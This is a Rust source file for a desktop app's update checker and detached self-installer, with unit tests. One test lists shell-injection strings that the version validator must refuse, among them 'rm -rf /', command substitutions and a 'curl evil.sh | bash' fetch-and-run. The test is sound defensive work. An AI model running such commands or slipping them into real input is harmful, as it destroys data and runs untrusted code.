//! Update checking, and handing an update off to the installer.
//!
//! # Why `curl` rather than an HTTP crate
//!
//! Reaching GitHub's API needs exactly one GET request, once, when the user
//! presses a button. Pulling in `reqwest` for that would add a TLS stack and
//! a large slice of the async ecosystem to a binary that otherwise has no
//! network code at all - and `Cargo.toml` deliberately lists `reqwest` as a
//! dependency this project does not take. `curl` ships with macOS and with
//! Windows 10+, so shelling out costs nothing and keeps the dependency tree
//! honest. The failure mode is also better: no curl means "couldn't check
//! for updates", not a broken build.
//!
//! # Why the install is a detached helper
//!
//! `install.sh` refuses to replace a running Remi, and it is right to - you
//! cannot safely swap a bundle out from under a live process. So the app
//! cannot install over itself directly. Instead it spawns a helper that
//! outlives it, waits for this process to actually exit, and only then runs
//! the installer and relaunches. That is the standard shape for a
//! self-replacing desktop app.
//!
//! The installer being reused rather than reimplemented is deliberate: it
//! already verifies the download's SHA-256 against the release's
//! `checksums.txt` before extracting anything, rolls back a failed
//! replacement, and is covered by 18 tests. Rewriting that logic in Rust
//! would mean maintaining two copies of a security-critical path.

use std::process::Command;

use serde::Serialize;

/// The repository releases are published from. Matches `install.sh`'s
/// default, and the URL in `README.md`.
const REPO: &str = "immanuelsavio/remi";

/// What a version check found.
#[derive(Serialize, Default)]
pub struct UpdateInfo {
    /// The running version, from `CARGO_PKG_VERSION`.
    pub current: String,
    /// The latest published tag, without its leading `v`. Empty if unknown.
    pub latest: String,
    /// Whether `latest` is strictly newer than `current`.
    pub available: bool,
    /// The release notes body, trimmed to something a panel can show.
    pub notes: String,
    /// The release's web page, for a manual download.
    pub url: String,
}

/// The version this build was compiled as.
pub fn current_version() -> String {
    env!("CARGO_PKG_VERSION").to_string()
}

/// Parse `1.2.3` into comparable parts, ignoring any `v` prefix and any
/// pre-release suffix (`1.2.3-beta.1` sorts as `1.2.3`).
fn parse_semver(raw: &str) -> Option<(u64, u64, u64)> {
    let cleaned = raw.trim().trim_start_matches(['v', 'V']);
    let core = cleaned.split(['-', '+']).next().unwrap_or(cleaned);
    let mut parts = core.split('.');
    let major = parts.next()?.parse().ok()?;
    // A tag may legitimately be `v1` or `v1.2`; treat the missing parts as 0
    // rather than refusing to compare.
    let minor = parts.next().unwrap_or("0").parse().unwrap_or(0);
    let patch = parts.next().unwrap_or("0").parse().unwrap_or(0);
    Some((major, minor, patch))
}

/// Whether `latest` is strictly newer than `current`.
///
/// An unparseable version answers `false`: refusing to offer an update is
/// always safer than offering a downgrade or a phantom.
pub fn is_newer(current: &str, latest: &str) -> bool {
    match (parse_semver(current), parse_semver(latest)) {
        (Some(c), Some(l)) => l > c,
        _ => false,
    }
}

/// Pull one string field out of a flat JSON object without a full parse.
fn json_str(body: &str, key: &str) -> String {
    serde_json::from_str::<serde_json::Value>(body)
        .ok()
        .and_then(|v| v.get(key).and_then(|x| x.as_str()).map(str::to_owned))
        .unwrap_or_default()
}

/// Ask GitHub for the latest published release.
///
/// Never returns `Err` for "there is no update" or "we could not reach the
/// network" - both are ordinary outcomes the UI should render calmly, not
/// error states. `Err` is reserved for a genuinely broken environment.
#[tauri::command]
pub async fn check_for_update() -> Result<UpdateInfo, String> {
    let current = current_version();
    let mut info = UpdateInfo {
        current: current.clone(),
        ..Default::default()
    };

    let url = format!("https://api.github.com/repos/{REPO}/releases/latest");
    let out = Command::new("curl")
        .args([
            "-fsSL",
            "--max-time",
            "15",
            "-H",
            "Accept: application/vnd.github+json",
            // GitHub rejects requests with no User-Agent.
            "-A",
            "remi-updater",
            &url,
        ])
        .output();

    // No network, no curl, a private repo, or simply no release yet: all
    // land here and all mean the same thing to the user.
    let Ok(out) = out else { return Ok(info) };
    if !out.status.success() {
        return Ok(info);
    }
    let body = String::from_utf8_lossy(&out.stdout);

    let tag = json_str(&body, "tag_name");
    if tag.is_empty() {
        return Ok(info);
    }
    info.latest = tag.trim_start_matches(['v', 'V']).to_string();
    info.available = is_newer(&current, &tag);
    info.url = json_str(&body, "html_url");
    let notes = json_str(&body, "body");
    info.notes = notes.chars().take(4000).collect();
    Ok(info)
}

/// Reject anything that is not plainly a version string.
///
/// This value is interpolated into a shell command, so it is the one input
/// on this path that could turn an update into arbitrary code execution.
/// An allowlist of `[A-Za-z0-9.-]` is checked rather than escaping,
/// because a legitimate version has no reason to contain anything else.
fn validate_version(version: &str) -> Result<(), String> {
    if version.is_empty()
        || !version
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
    {
        return Err(format!(
            "Refusing to install a suspicious version: {version:?}"
        ));
    }
    Ok(())
}

/// Build the shell program the detached helper runs.
///
/// Split out from the spawn so the command can be asserted on in a test -
/// this string decides what gets executed on the user's machine, which is
/// not something to leave unexamined.
fn helper_script(pid: u32, version: &str) -> String {
    // `--version` pins the exact release the user was shown, so a release
    // published between the check and the click cannot substitute itself.
    // Waiting on the PID is what lets install.sh see Remi as stopped.
    //
    // The installer comes from the TAG, not from `main`. Pinning the
    // release while fetching the script from a moving branch pinned only
    // half the update: whatever was on `main` at that moment - mid-edit,
    // mid-force-push, or worse - is what ran. A tag is immutable, so the
    // script that installs vX.Y.Z is the script that shipped with it.
    //
    // It is also downloaded, checked and only then run, rather than piped
    // straight into an interpreter: `curl | bash` executes whatever
    // arrives, including a truncated half-script from a dropped
    // connection. `set -e` cannot save a shell that is being fed a file
    // as it downloads.
    format!(
        "while kill -0 {pid} 2>/dev/null; do sleep 1; done; \
         sleep 1; \
         d=$(mktemp -d) || exit 1; \
         trap 'rm -rf \"$d\"' EXIT; \
         curl -fsSL -o \"$d/install.sh\" \
           https://raw.githubusercontent.com/{REPO}/v{version}/install.sh || exit 1; \
         head -n1 \"$d/install.sh\" | grep -q '^#!' || exit 1; \
         bash \"$d/install.sh\" --version {version} --launch"
    )
}

/// Start the updater and report back; the caller then quits the app.
///
/// Returns as soon as the helper is spawned. The frontend must go through
/// the normal quit handshake afterwards so state is flushed - the helper is
/// waiting for this process to exit, and killing it any other way would
/// skip the save.
#[tauri::command]
pub async fn install_update(version: String) -> Result<(), String> {
    validate_version(&version)?;
    let pid = std::process::id();
    Command::new("bash")
        .arg("-c")
        .arg(helper_script(pid, &version))
        .spawn()
        .map_err(|e| format!("Couldn't start the updater: {e}"))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn compares_versions_numerically_not_as_text() {
        assert!(
            is_newer("0.9.0", "0.10.0"),
            "0.10 > 0.9 despite sorting lower as text"
        );
        assert!(is_newer("1.2.3", "1.2.4"));
        assert!(is_newer("1.2.3", "2.0.0"));
        assert!(!is_newer("1.2.3", "1.2.3"));
        assert!(!is_newer("2.0.0", "1.9.9"), "never offer a downgrade");
    }

    #[test]
    fn tolerates_a_v_prefix_and_short_tags() {
        assert!(is_newer("0.1.0", "v0.2.0"));
        assert!(is_newer("v1.0.0", "2"));
        assert!(!is_newer("v2", "v1.9"));
    }

    #[test]
    fn an_unparseable_version_never_offers_an_update() {
        assert!(!is_newer("0.1.0", "nightly"));
        assert!(!is_newer("", "1.0.0"));
        assert!(!is_newer("0.1.0", ""));
    }

    #[test]
    fn a_prerelease_tag_compares_on_its_release_core() {
        // Not full semver precedence - deliberately. Treating 1.3.0-beta.1
        // as 1.3.0 offers the beta to someone on 1.2.0, which is what a
        // beta channel wants.
        assert!(is_newer("1.2.0", "1.3.0-beta.1"));
        assert!(!is_newer("1.3.0", "1.3.0-beta.1"));
    }

    #[test]
    fn the_helper_waits_for_exit_then_pins_the_version() {
        let script = helper_script(4242, "0.2.0");
        assert!(
            script.contains("kill -0 4242"),
            "must wait for THIS process to exit"
        );
        assert!(
            script.contains("--version 0.2.0"),
            "must pin the version the user was shown, not whatever is latest at download time"
        );
        assert!(
            script.contains("--launch"),
            "should come back up afterwards"
        );
        // The installer is fetched from the TAG. Pinning the release while
        // pulling the script from a moving branch pinned only half the
        // update - whatever sat on `main` at that instant is what ran.
        assert!(
            script.contains("/v0.2.0/install.sh"),
            "the installer must come from the tag, not from main: {script}"
        );
        assert!(
            !script.contains("main/install.sh"),
            "must not fetch the installer from a mutable branch"
        );
        // Downloaded, checked, THEN run. Piping into an interpreter
        // executes whatever arrives, including a truncated half-script
        // from a dropped connection.
        assert!(
            !script.contains("| bash"),
            "must not pipe a download straight into a shell: {script}"
        );
        assert!(
            script.contains("grep -q '^#!'"),
            "must sanity-check what it downloaded"
        );
    }

    #[test]
    fn refuses_a_version_string_that_could_carry_shell_syntax() {
        for bad in [
            "0.1.0; rm -rf /",
            "$(whoami)",
            "`id`",
            "0.1.0 && curl evil.sh | bash",
            "0.1.0 | tee /etc/passwd",
            "../../etc",
            "",
        ] {
            assert!(validate_version(bad).is_err(), "must refuse {bad:?}");
        }
    }

    #[test]
    fn accepts_the_version_shapes_releases_actually_use() {
        for good in ["0.1.0", "1.2.3", "0.2.0-beta.1", "10.0.0-rc1"] {
            assert!(validate_version(good).is_ok(), "must accept {good:?}");
        }
    }
}
